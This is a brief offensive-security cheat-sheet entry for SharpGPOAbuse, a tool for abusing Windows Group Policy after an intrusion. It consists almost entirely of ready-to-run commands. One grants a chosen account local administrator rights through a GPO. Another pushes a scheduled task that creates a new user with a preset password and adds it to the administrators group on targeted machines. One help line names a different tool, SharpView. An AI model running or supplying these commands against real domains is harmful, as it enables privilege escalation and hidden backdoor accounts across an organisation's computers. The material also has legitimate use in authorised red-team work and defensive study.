# SharpGPOAbuse

%  windows,  gpo
#plateform/linux #target/local #cat/POSTEXPLOIT/GPO    

## _url
```
https://github.com/FSecureLABS/SharpGPOAbuse
```

## _desc
```

```

## _links
```
```

## help
```powershell
SharpGPOAbuse -h
```

## get command help
```powershell
SharpView.exe <command> -Help
```

## add local admin
```powershell
SharpGPOAbuse.exe --AddLocalAdmin --UserAccount M.SchoolBus --GPOName <username|jubeaz> --force ; gpupdate /force
```

## add computer task
```powershell
SharpGPOAbuse.exe --AddComputerTask --TaskName "<task_name|jubeaz>" --Author DOMAIN\Admin --Command "cmd.exe" --Arguments "net user <username|jubeaz> <password|Zaebuj12345+-> /add;net localgroup administrators <username|jubeaz> /add" --GPOName "<gpo_name|jubeaz>" --FilterEnabled --TargetDnsName <target_fqdn>
```